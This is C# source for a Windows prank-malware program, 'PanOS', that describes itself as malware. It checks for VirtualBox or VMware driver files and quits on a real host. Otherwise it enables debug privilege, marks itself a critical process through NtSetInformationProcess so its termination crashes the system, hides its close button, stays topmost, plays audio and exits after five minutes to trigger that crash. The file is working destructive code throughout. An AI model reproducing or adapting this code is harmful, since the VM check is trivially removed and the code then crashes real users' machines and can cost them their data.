using System;
using System.IO;
using Microsoft.Win32;
using System.Diagnostics;
using System.Windows.Forms;
using System.Media;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.Drawing;

namespace PanOSMain
{
    public partial class PanOSMain : Form
    {
        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);

        private const int CP_NOCLOSE_BUTTON = 0x200;
        protected override CreateParams CreateParams
        {
            get
            {
                CreateParams myCp = base.CreateParams;
                myCp.ClassStyle = myCp.ClassStyle | CP_NOCLOSE_BUTTON;
                return myCp;
            }
        }
        private const int WM_NCHITTEST = 0x84;
        private const int HTCLIENT = 0x1;
        private const int HTCAPTION = 0x2;

        ///
        /// Handling the window messages
        ///
        protected override void WndProc(ref Message message)
        {
            base.WndProc(ref message);

            if (message.Msg == WM_NCHITTEST && (int)message.Result == HTCLIENT)
                message.Result = (IntPtr)HTCAPTION;
        }
        bool isVM()
        {
            var vbox = @"C:\Windows\System32\drivers\vboxmouse.sys";
            var vmware = @"C:\Windows\System32\DriverStore\FileRepository\vmmouse.inf_amd64_916101d3748847e7\vmmouse.sys";
            if (File.Exists(vbox) || File.Exists(vmware))
            {
                return true;
            }
            else
            {
                return false;
            }
        }
        public PanOSMain()
        {
            if (isVM() == false)
            {
                MessageBox.Show("You're not using a Virtual Machine, so you may not proceed. If you have been infected on your host, please email the creator at orangemanagementcorpn@gmail.com for steps to remove this malware.", "Virtual Machine Check", MessageBoxButtons.OK, MessageBoxIcon.Error);
                Environment.Exit(0);
            }
            else
            {
                try
                {
                    InitializeComponent();
                    this.CenterToScreen();
                    this.TopMost = true;
                    this.TransparencyKey = Color.White; //why, just why, f*ck american english
                } catch
                {
                    MessageBox.Show("Error initializing Form1");
                }
                Next();
            }
        }
        private async void Next()
        {
                int isCritical = 1;
                int BreakOnTermination = 0x1D;

                Process.EnterDebugMode();

                NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref isCritical, sizeof(int));

                SoundPlayer playmusic = new SoundPlayer();
                playmusic.SoundLocation = @"C:\Windows\SystemUpdateResources\Windows 8 Error Dubstep Remix.wav";
                playmusic.Play();
                if (playmusic.IsLoadCompleted)
                {
                    await Delay(300000);
                    Environment.Exit(0);
                }
        }
        private async Task Delay(int howlong)
        {
            await Task.Delay(howlong);
        }

        private void whatHappenedButton_Click(object sender, EventArgs e)
        {
            Information form = new Information();
            form.Show();
        }
    }
}
